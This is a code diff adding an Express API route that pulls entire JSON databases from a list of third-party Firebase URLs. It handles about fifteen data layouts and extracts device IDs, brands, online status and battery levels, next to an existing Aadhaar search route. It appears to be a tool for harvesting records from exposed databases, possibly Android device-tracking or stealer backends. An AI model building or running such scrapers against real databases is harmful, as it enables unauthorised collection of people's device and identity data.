@@ -376,6 +376,103 @@ app.get('/api/url/:id/device/:deviceId/searchaadhar', async (req, res) => {
   }
 });
 
+// ── Live fetch: get devices directly from Firebase (bypasses cached DB) ───────
+app.get('/api/url/:id/live', async (req, res) => {
+  const id = parseInt(req.params.id);
+  const target = TARGETS.find(t => t.id === id);
+  if (!target) return res.status(404).json({ error: 'Not found' });
+
+  const { url, schema } = target;
+
+  // Determine main endpoint per schema (mirrors DA1.py logic)
+  let mainEndpoint;
+  if (schema === 1)                           mainEndpoint = `${url}/All_Users.json`;
+  else if (schema === 2 || schema === 4)      mainEndpoint = `${url}/clients.json`;
+  else if (schema === 3)                      mainEndpoint = `${url}/user_data.json`;
+  else if (schema === 5)                      mainEndpoint = `${url}/devices.json`;
+  else if (schema === 6)                      mainEndpoint = `${url}/data.json`;
+  else if (schema === '8a')                   mainEndpoint = `${url}/omex.json`;
+  else if (['8b',9,10,11,14,15].includes(schema)) mainEndpoint = `${url}/.json`;
+  else if (schema === 12)                     mainEndpoint = `${url}/devices.json`;
+  else if (schema === 13)                     mainEndpoint = `${url}/admin.json`;
+  else                                        mainEndpoint = `${url}/All_Users.json`;
+
+  try {
+    const resp = await fetch(mainEndpoint, {
+      headers: { 'User-Agent': 'Mozilla/5.0' },
+      signal: AbortSignal.timeout(20000),
+    });
+    if (!resp.ok) return res.json({ error: `Firebase HTTP ${resp.status}`, devices: [] });
+    const data = await resp.json();
+
+    // Extract device list per schema
+    let rawDevs = {};
+    if (schema === 1) {
+      rawDevs = (data?.Data?.DeviceInfo) || {};
+    } else if (schema === '8a') {
+      rawDevs = data?.All_User?.Info || {};
+    } else if (schema === '8b') {
+      rawDevs = data?.omex?.All_User?.Info || {};
+    } else if (schema === 9) {
+      rawDevs = data?.user_data || {};
+    } else if (schema === 10 || schema === 11) {
+      rawDevs = data?.clients || {};
+    } else if (schema === 12) {
+      rawDevs = data || {};
+    } else if (schema === 13) {
+      // flatten admin[X].users
+      if (data && typeof data === 'object') {
+        for (const av of Object.values(data)) {
+          if (av && typeof av === 'object' && av.users) {
+            for (const [uid, udat] of Object.entries(av.users)) {
+              if (udat && typeof udat === 'object') rawDevs[uid] = udat;
+            }
+          }
+        }
+      }
+    } else if (schema === 14) {
+      const ud = data?.user_data || {};
+      const cl = data?.clients || {};
+      for (const [k,v] of Object.entries(ud)) if (v && typeof v==='object') rawDevs[k] = v;
+      for (const [k,v] of Object.entries(cl)) if (!rawDevs[k] && v && typeof v==='object') rawDevs[k] = v;
+    } else if (schema === 15) {
+      const users = data?.users || {};
+      for (const [,udat] of Object.entries(users)) {
+        if (udat?.DeviceId) rawDevs[udat.DeviceId] = udat;
+      }
+    } else {
+      rawDevs = (data && typeof data === 'object') ? data : {};
+    }
+
+    // Build simplified device list from live data
+    const now = Date.now();
+    const devices = Object.entries(rawDevs)
+      .filter(([, d]) => d && typeof d === 'object')
+      .map(([deviceId, d]) => {
+        // Determine online status
+        let isOnline = false;
+        if (schema === 1)       isOnline = d.Status === 'Online';
+        else if (schema === '8a' || schema === '8b') isOnline = d.status === 'Online';
+        else if (schema === 9)  isOnline = d.status === 'online';
+        else if (schema === 15) isOnline = d.Status === 'Online';
+        else                    isOnline = d.status === true || d.status === 'online' || d.status === 'Online';
+
+        // Brand
+        let brand = d.Brand || d.Name || d.brand || d.modelName || d.d_name || d.DeviceId || 'Unknown';
+
+        // Battery
+        let battery = d.Battery || d.battery || 'N/A';
+
+        return { deviceId, brand: String(brand), status: isOnline ? 'online' : 'offline', battery: String(battery) };
+      })
+      .sort((a, b) => (a.status === 'online' ? -1 : 1) - (b.status === 'online' ? -1 : 1));
+
+    res.json({ id, total: devices.length, online: devices.filter(d=>d.status==='online').length, devices });
+  } catch (e) {
+    res.json({ error: e.message, devices: [] });
+  }
+});
+
 // ── Global device search across all URLs ─────────────────────────────────────
 app.get('/api/search/device/:deviceId', (req, res) => {
   const q = req.params.deviceId.toLowerCase().trim();
